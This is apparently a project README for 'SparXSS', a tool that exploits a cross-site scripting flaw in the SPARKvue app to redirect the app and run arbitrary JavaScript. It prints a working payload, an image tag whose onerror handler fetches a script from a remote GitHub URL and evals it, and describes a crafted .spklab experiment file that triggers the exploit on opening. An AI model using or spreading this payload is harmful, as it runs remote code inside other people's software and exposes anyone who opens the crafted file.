# SparXSS

## A JS Script For Redirection And Custom Javascript Execution For The SPARKvue XSS Vulnerability Found By ohonbob

Run it using:<br>```<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r => r.text()).then(c => eval(c))'>```

You Can Also Use The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App

The If Statement In The First Line Was Because It Would Execute Multiple Times While I Was Testing It

# ToDo
- ~~Make Icon's Show up for Every URL~~
- Make the custom URL's stay when you export the .spklab file (close to getting this working)
